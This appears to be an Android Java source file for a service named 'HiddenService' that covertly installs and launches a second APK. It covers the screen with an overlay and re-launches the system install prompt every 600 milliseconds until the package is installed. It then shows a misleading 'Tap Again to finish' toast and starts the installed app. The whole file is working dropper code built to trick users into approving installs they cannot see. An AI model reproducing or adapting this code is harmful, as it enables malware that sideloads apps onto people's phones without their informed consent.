package secretapp.web.com;

import android.app.Service;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.text.TextUtils;
import android.widget.Toast;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.atomic.AtomicBoolean;

import main_commons.app.c_master.commons.system.MyFileProvider;

public class HiddenService extends Service {

    public static final String APK_FILE_PATH = "argument_1";

    private Timer delayedStartTimer;

    private static AtomicBoolean isServiceRunning = new AtomicBoolean(false);

    final Handler uiHandler = new Handler(Looper.getMainLooper());

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        final String filePath = intent.getStringExtra(APK_FILE_PATH);
        if (TextUtils.isEmpty(filePath)) {
            stopService();
            return START_NOT_STICKY;
        }
        final String packageName = Utils.getPackageName(getApplicationContext(), filePath);
        if (packageName == null) {
            stopService();
            return START_NOT_STICKY;
        }
        killTimer();
        delayedStartTimer = new Timer();
        SecretAppComponent.get().getOverlayHelper().release(getApplicationContext());
        SecretAppComponent.get().getOverlayHelper().showOverlay(getApplicationContext());
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                delayedStartTimer.scheduleAtFixedRate(createTimerTask(filePath, packageName), 0, 600);
            }
        }, 1000);
        isServiceRunning.set(true);
        return START_REDELIVER_INTENT;
    }

    private void stopService() {
        killTimer();
        SecretAppComponent.get().getOverlayHelper().release(getApplicationContext());
        stopSelf();
        isServiceRunning.set(false);
        try {
            uiHandler.removeCallbacksAndMessages(null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void killTimer() {
        if (delayedStartTimer != null) {
            delayedStartTimer.cancel();
            delayedStartTimer.purge();
            delayedStartTimer = null;
        }
    }

    public static boolean isServiceRunning() {
        return isServiceRunning.get();
    }

    private void launchApkActivity(Context context, String apkFilePath) throws Exception {
        Intent intent = new Intent(Intent.ACTION_VIEW);
        Uri uri = MyFileProvider.getUriForFile(context, new File(apkFilePath));
        intent.setDataAndType(uri, "application/vnd.android.package-archive");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        context.startActivity(intent);
    }

    private TimerTask createTimerTask(final String filePath, final String packageName) {
        return new TimerTask() {
            @Override
            public void run() {
                if (TextUtils.isEmpty(packageName)) {
                    stopService();
                    return;
                }
                if (Utils.isAppInstalled(getApplicationContext(), packageName)) {
                    onAppInstalled(packageName);
                    return;
                }
                try {
                    launchApkActivity(getApplicationContext(), filePath);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
    }

    private void launchApp(Context context, String packageName) {
        try {
            Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(packageName);
            context.startActivity(launchIntent);
        } catch (ActivityNotFoundException e) {
            e.printStackTrace();
        }
    }

    private void onAppInstalled(final String packageName) {
        /*if (!isAppActivated(packageName)) {
            Timber.d("onAppInstalled -> App not activated");
            return;
        }*/
        killTimer();
        uiHandler.post(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(getApplicationContext(), "Tap Again to finish", Toast.LENGTH_SHORT).show();
            }
        });
        uiHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                launchApp(SecretAppComponent.get().context(), packageName);
            }
        }, 4000L);
        uiHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                stopService();
            }
        }, 5500L);
    }

    private boolean isAppActivated(String packageName) {
        try {
            ApplicationInfo ai = getApplicationContext().getPackageManager().getApplicationInfo(packageName, 0);
            return ai.enabled;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }
}
